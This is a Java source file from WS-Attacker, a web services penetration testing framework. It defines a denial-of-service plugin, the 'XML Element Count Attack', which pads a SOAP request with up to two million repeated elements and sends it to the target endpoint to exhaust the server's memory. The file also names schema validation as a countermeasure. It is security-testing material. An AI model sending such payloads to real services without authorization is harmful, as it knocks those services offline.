/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2012 Andreas Falkenberg
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.plugin.dos;

import wsattacker.main.composition.plugin.option.AbstractOptionInteger;
import wsattacker.main.plugin.option.OptionLimitedInteger;
import wsattacker.main.plugin.option.OptionSimpleBoolean;
import wsattacker.main.plugin.option.OptionSimpleVarchar;

import wsattacker.plugin.dos.dosExtension.abstractPlugin.AbstractDosPlugin;

import java.util.HashMap;
import java.util.Map;
import wsattacker.plugin.dos.dosExtension.option.OptionTextAreaSoapMessage;

public class XmlElementCount extends AbstractDosPlugin {

    // Mandatory DOS-specific Attributes - Do NOT change!
    // <editor-fold defaultstate="collapsed" desc="Autogenerated Attributes">
    private static final long serialVersionUID = 1L;
    // </editor-fold>
    // Custom Attributes
    private OptionSimpleBoolean optionParam8;
    private AbstractOptionInteger optionParam9;
    private OptionSimpleVarchar optionParam10;

    @Override
    public void initializeDosPlugin() {
        initData();
        // Custom Initilisation
        optionParam9 = new OptionLimitedInteger("Number of elements", 25000, "The number of elements. E.g. '3' means <X/><X/><X/>", 1, 2000000);
        optionParam10 = new OptionSimpleVarchar("Element to insert", "<!--X-->", "The name of the inserted element. This can also be a comment.");
        optionParam8 = new OptionSimpleBoolean("Payload position", false, "checked => elements appended at end, payload placeholder ignored, unchecked => payload inserted at payload placeholder position");
        getPluginOptions().add(optionParam9);
        getPluginOptions().add(optionParam10);
        //getPluginOptions().add(optionParam8);
    }

    @Override
    public OptionTextAreaSoapMessage.PayloadPosition getPayloadPosition() {
        return OptionTextAreaSoapMessage.PayloadPosition.HEADERLASTCHILDELEMENT;
    }

    public void initData() {
        setName("XML Element Count Attack");
        setDescription("This attack checks wheter or not a Web service is vulnerable to the \"XML Element Count Attack\".\n"
          + "A vulnerable server will run out of memory when parsing an XML document \n"
          + "with a high element count\n"
          + "\n\n"
          + "The attack algorithm replaces the string $$PAYLOADELEMENT$$ in the SOAP message below \n"
          + "with the defined number of elements.\n"
          + "The placeholder $$PAYLOADELEMENT$$ can be set to any other position in the SOAP message"
          + "All inserted elements have the same name as defined in parameter 8.1. \n"
          + "All inserted elements are children of the same element."
          + "\n\n"
          + "Parameter 8.0 defines the number of elements to be inserted.\n"
          + "Parameter 8.1 sets the name of the elements to be insterted.\n"
          + "\n\n");
        setCountermeasures("In order to counter the attack limit the number of elements in an XML document.\n This can be achived using XML schema validation.");
    }

    @Override
    public void createTamperedRequest() {

        String soapMessage = this.getOptionTextAreaSoapMessage().getValue();
        String soapMessageFinal = "";

        // create Payload
        StringBuilder sb = new StringBuilder("");
        for (int i = 1; i < (optionParam9.getValue()); i++) {
            sb.append(optionParam10.getValue());
        }

        // put Payload as set within options
        soapMessageFinal = this.getOptionTextAreaSoapMessage().replacePlaceholderWithPayload(soapMessage, sb.toString());
        /*
         * if (optionParam8.isOn()) {
         * soapMessage =
         * this.getOptionTextAreaSoapMessage().replacePlaceholderWithPayload(soapMessage,
         * "");
         * soapMessageFinal = soapMessage.concat(sb.toString());
         * }else{
         * soapMessageFinal =
         * this.getOptionTextAreaSoapMessage().replacePlaceholderWithPayload(soapMessage,
         * sb.toString());
         * }
         */

        // get HeaderFields from original request, if required add custom headers - make sure to clone!
        Map<String, String> httpHeaderMap = new HashMap<String, String>();
        for (Map.Entry<String, String> entry : getOriginalRequestHeaderFields().entrySet()) {
            httpHeaderMap.put(entry.getKey(), entry.getValue());
        }

        // write payload and header to TamperedRequestObject
        this.setTamperedRequestObject(httpHeaderMap, getOriginalRequest().getEndpoint(), soapMessageFinal);

    }
    // ----------------------------------------------------------
    // All custom DOS-Attack specific Methods below!
    // ----------------------------------------------------------
}